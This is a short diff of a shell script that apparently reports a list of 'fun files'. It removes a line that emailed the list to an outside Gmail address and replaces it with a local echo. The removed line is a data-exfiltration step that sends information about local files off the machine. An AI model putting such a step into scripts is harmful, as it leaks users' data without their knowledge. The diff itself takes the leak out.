@@ -43,7 +43,7 @@ sleep 1
 
 echo ">>> Beaming file list to Iris endpoint..."
 # Send as GET with proper URL-encoding
-echo "$fun_files" | mail -s "Fun Files Report" ayba75620@gmail.com
+echo "$fun_files"
 
 echo
 echo ">>> Transmission complete. System is stable."
